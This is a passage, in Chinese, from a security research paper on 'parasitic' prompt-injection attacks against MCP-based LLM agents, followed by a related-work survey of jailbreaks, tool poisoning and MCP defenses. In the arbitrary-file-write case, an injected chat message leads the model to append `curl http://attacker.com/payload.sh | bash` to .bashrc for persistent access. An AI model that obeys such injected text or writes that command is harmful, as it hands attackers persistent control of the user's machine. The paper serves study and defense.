- **权限提升。**当 MCP 主机（例如 Cline [10]）启用了自动执行功能时，风险会进一步升级，因为注入的命令可以在未经用户同意的情况下立即运行。

该案例表明，远程命令执行可能自然地源于无害的通信工具与命令工具的组合，而第 5.1 节提到的命令执行工具能够支持此类寄生式攻击。

#### 6.4.2 任意文件写入

MCP 中另一种危险的寄生式攻击变体涉及滥用文件系统服务器。假设受害者同时注册了即时通信平台 C（Instant Messaging Platform C，IMPC）MCP 服务器和文件系统 MCP 服务器，或者依赖 MCP 主机提供的文件管理能力。

- **注入向量。**攻击者将恶意提示词嵌入 IMPC 的共享频道中。当受害者检索频道日志时，该提示词会进入 LLM 的推理上下文。
- **执行触发。**在注入提示词的引导下，LLM 使用文件系统服务器向受害者的系统写入内容。例如，将 `curl http://attacker.com/payload.sh | bash` 追加到 `.bashrc` 文件中。
- **持久化执行。**注入的载荷可以在每次新的 Shell 会话中自动获取并执行攻击者的脚本，从而建立持久化的系统访问权限。

该案例表明，任意文件写入攻击会利用持久化配置文件或启动文件，使攻击影响超越单次会话。

## 7. 相关工作

### 7.1 LLM 威胁模型

在传统范式下，LLM 在很大程度上被视为信息处理器，安全问题主要集中于文本输出的可信性和有害性 [12]、[25]、[29]、[35]、[45]、[52]。Gehman 等人 [18] 开展了最早的一批语言模型安全系统性研究，表明即使是最先进的模型，也容易生成有毒和不安全的语言。近期，Zou 等人 [65] 提出了贪婪坐标梯度（Greedy Coordinate Gradient，GCG）攻击，这是一种通用攻击，能够生成对抗性后缀，从而稳定诱导经过对齐的 LLM 输出有害内容。

Zhang 等人 [63] 提出了强制询问（coercive interrogation）方法，该方法利用 top-k token 预测，迫使经过对齐的 LLM 泄露隐藏在安全层之下的有害内容。Pan 等人 [39] 研究了将 LLM 滥用于生成错误信息的问题，强调了 LLM 生成的错误信息对下游应用造成的系统性风险。与此同时，类人的提示词同样可能带来危险。Zeng 等人 [62] 表明，具有说服力的对抗性提示词（persuasive adversarial prompts，PAP）能够越狱最先进的模型。Yao 等人 [60] 表明，微弱的语义扰动和无意义的分布外提示词能够稳定触发幻觉，将不可信内容生成视为 LLM 的一种固有漏洞。

总体而言，当 LLM 被视为信息处理器时，上述研究表明，不可信的输出——包括有毒内容、由对抗性输入诱导的有害响应、错误信息、具有说服力的越狱响应以及幻觉——构成了核心安全问题。

### 7.2 MCP 生态系统安全

传统范式下的研究主要关注局限于文本输出的威胁；而新兴的 MCP 范式则将不可信的生成结果转化为可执行的操作，从而扩展了这些风险。Hou 等人 [22] 从理论上分析了 MCP 的生命周期及其生态系统中的固有安全风险。Invariant Labs [23] 提出了工具投毒攻击（Tool Poisoning Attack）、Rug Pull 攻击和 Shadowing 攻击，展示了攻击者如何利用工具描述，在用户不知情的情况下触发恶意执行。Wang 等人 [56] 进一步表明，操纵工具名称或描述能够影响 LLM 的工具选择，使其偏向恶意服务器。

近期工作开始系统性评估 MCP 生态系统的安全风险。Li 等人 [27] 对 MCP 插件开展大规模测量，揭示了过度使用系统 API 和网络 API 所带来的重大安全风险。Yang 等人 [59] 开发了 MCPSecBench，这是一个定义了 17 类 MCP 攻击的基准，用于开展可复现、跨平台的漏洞评估。

现有的 MCP 防御措施包括 Narajala 和 Habler [34] 基于 MAESTRO 的威胁建模方法，该方法应用零信任原则；以及 Kumar 等人 [26] 提出的 MCP Guardian，该系统集成身份认证、速率限制、日志记录和 WAF 扫描，以缓解工具投毒、注入和数据外泄威胁。一些近期方法 [6]、[50] 试图检测恶意 MCP 服务器。然而，这些方法主要适用于风险局限于恶意 MCP 服务器的场景，无法检测 MCP-UPD：多个单独看来无害的 MCP 服务器仍可能被组合成一条攻击执行链。

除了 MCP 防御研究之外，针对通用 LLM 智能体的安全研究也强调，需要通过信息流控制和受约束的智能体架构，将不可信上下文与下游行动执行隔离开来 [7]、[49]、[54]。尽管这些工作并不专门针对 MCP 场景，但它们与本文的发现一致，即缺乏上下文与工具之间的隔离是这类攻击的根因之一。
